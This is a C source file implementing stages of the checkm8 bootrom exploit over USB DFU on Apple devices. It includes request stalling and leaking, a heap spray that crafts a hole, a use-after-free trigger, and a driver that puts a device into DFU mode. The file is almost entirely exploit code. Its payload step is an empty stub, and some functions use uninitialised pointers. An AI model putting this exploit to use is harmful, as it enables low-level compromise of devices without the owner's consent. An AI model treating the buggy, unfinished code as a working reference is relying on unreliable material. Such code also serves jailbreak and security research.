#include <exploit/exploit.h>

// ******************************************************
// Function: checkm8Reset()
//
// Purpose: Trigger a DFU mode reset on the device
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the reset was successful, false otherwise
// ******************************************************
bool checkm8Reset(device_t *device)
{
    transfer_ret_t transferRet;
    if (sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == DFU_FILE_SUFFIX_LENGTH
    && DFUSetStateWaitReset(&device->handle) == true
    && sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == EP0_MAX_PACKET_SIZE)
    {
        return true;
    }
    sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    return false;
}

// ******************************************************
// Function: checkm8Stall()
//
// Purpose: Place the device into a stalled state
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the stall was successful, false otherwise
// ******************************************************
bool checkm8Stall(device_t *device)
{
    char data[0xC0];
    memset(data, 'A', 0xC0);
    transfer_ret_t *transferRet;
    return sendUSBControlRequestAsync(&device->handle, 0x21, DFU_ABORT, 0x304, 0x40A, &data, 0xC0, 4, transferRet);
}

// ******************************************************
// Function: checkm8Leak()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8Leak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC0, transferRet);
}

// ******************************************************
// Function: checkm8NoLeak()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8NoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1, transferRet);
}

// ******************************************************
// Function: checkm8USBRequestStall()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8USBRequestStall(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x2, DFU_GETSTATUS, 0x0, 0x80, 0x0, transferRet);
}

// ******************************************************
// Function: checkm8USBRequestLeak()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8USBRequestLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40, transferRet);
}

// ******************************************************
// Function: checkm8USBRequestNoLeak()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8USBRequestNoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x41, transferRet);
}

// TODO: Handle timeouts correctly for different stages - could use a sendUSBControlRequestWithTimeout() function

// ******************************************************
// Function: checkm8HeapSpray()
//
// Purpose: Spray the heap in order to craft a hole for the IO buffer allocation
//
// Parameters:
//      device_t *device: the device to reset
//
// ******************************************************
void checkm8HeapSpray(device_t *device)
{
    if (config_large_leak > 0)
    {
        checkm8USBRequestStall(device);
        for (int i = 1; i <= config_large_leak; i++)
        {
            checkm8USBRequestLeak(device);
        }
        checkm8USBRequestNoLeak(device);
    }
    else
    {
        checkm8Stall(device);
        for (int i = 1; i <= config_hole; i++)
        {
            checkm8NoLeak(device);
        }
        checkm8USBRequestLeak(device);
        checkm8NoLeak(device);
    }
}

// ******************************************************
// Function: checkm8Trigger()
//
// Purpose: Trigger the use-after-free vulnerability
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the trigger was successful, false otherwise
// ******************************************************
bool checkm8Trigger(device_t *device)
{
    char *data = malloc(0x800);
    memset(data, 'A', 0x800);
    transfer_ret_t *transferRet;
    bool ret = sendUSBControlRequestAsync(&device->handle, 0x21, DFU_DNLOAD, 0, 0, data, 0x800, 1, transferRet);
    free(data);
    ret = sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, transferRet);
    return ret;
}

// ******************************************************
// Function: checkm8Patch()
//
// Purpose: Send the payload to the device and trigger it's execution
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the payload was sent successfully, false otherwise
// ******************************************************
bool checkm8Patch(device_t *device)
{
    // TODO: Split payload into 0x800 sized chunks, calculate size taking into account size of uint8_t
    return true;
}

// ******************************************************
// Function: checkm8Done()
//
// Purpose: Check if the device has been successfully exploited
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the device has been successfully exploited, false otherwise
// ******************************************************
int checkm8Done(device_t *device)
{
    return isSerialNumberPwned(getDeviceSerialNumber(&device->handle));
}

// ******************************************************
// Function: checkm8PrepareDevice()
//
// Purpose: Get the device into DFU mode
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      int: 0 if the device was successfully placed into DFU mode, -1 if there is an error
// ******************************************************
int checkm8PrepareDevice(device_t *device) {
    int ret = findDevice(device);
    if (ret == -1)
    {
        return -1;
    }

    if (device->mode == MODE_NORMAL) {
        LOG(LOG_SUCCESS, "Found device in normal mode");
        LOG_NO_NEWLINE(LOG_INFO, "Press enter to place device into recovery mode");
        getchar();
        LOG(LOG_INFO, "Placing device into recovery mode");
        LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
        if (enterRecoveryMode() != 0) {
            LOG(LOG_ERROR, "Failed to place device with udid %s into recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_INFO, "Waiting for device to enter recovery mode");
        if (waitForDeviceInMode(device, MODE_RECOVERY, 20) != 0) {
            LOG(LOG_ERROR, "Device with udid %s failed to enter recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered recovery mode successfully!", device->serialNumber);
    }

    if (device->mode == MODE_RECOVERY) {
        // TODO: DFU helper
        LOG(LOG_INFO, "Please put device into DFU mode manually");
        LOG(LOG_INFO, "Waiting for device to enter DFU mode");
        if (waitForDeviceInMode(device, MODE_DFU, 30) != 0) {
            LOG(LOG_FATAL, "Could not find device in DFU mode after 30 seconds", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered DFU mode successfully!");
    }

    if (isSerialNumberPwned(device->serialNumber) == 0)
    {
        LOG(LOG_ERROR, "Device is already in pwned DFU mode, not performing exploit");
        return 1;
    }
    else
    {
        LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
    }
    return 0;
}

// ******************************************************
// Function: checkm8()
//
// Purpose: Perform the checkm8 exploit
//
// Returns:
//      int: 0 if the exploit was successful, -1 if there is an error
// ******************************************************
int checkm8()
{
    device_t device;
    if (checkm8PrepareDevice(&device) != 0)
    {
        LOG(LOG_FATAL, "Failed to prepare device");
        return -1;
    }

    bool pwned;
    bool waitUSB = waitUSBHandle(&device.handle, &checkm8CheckUSBDevice, &pwned);
    if (waitUSB == false)
    {
        LOG(LOG_FATAL, "Failed to connect to USB device");
        return -1;
    }

    LOG_NO_NEWLINE(LOG_INFO, "Press enter to exploit device");
    getchar();

    LOG(LOG_DEBUG, "Serial number: %s", getDeviceSerialNumber(&device.handle));

    return 0;
}
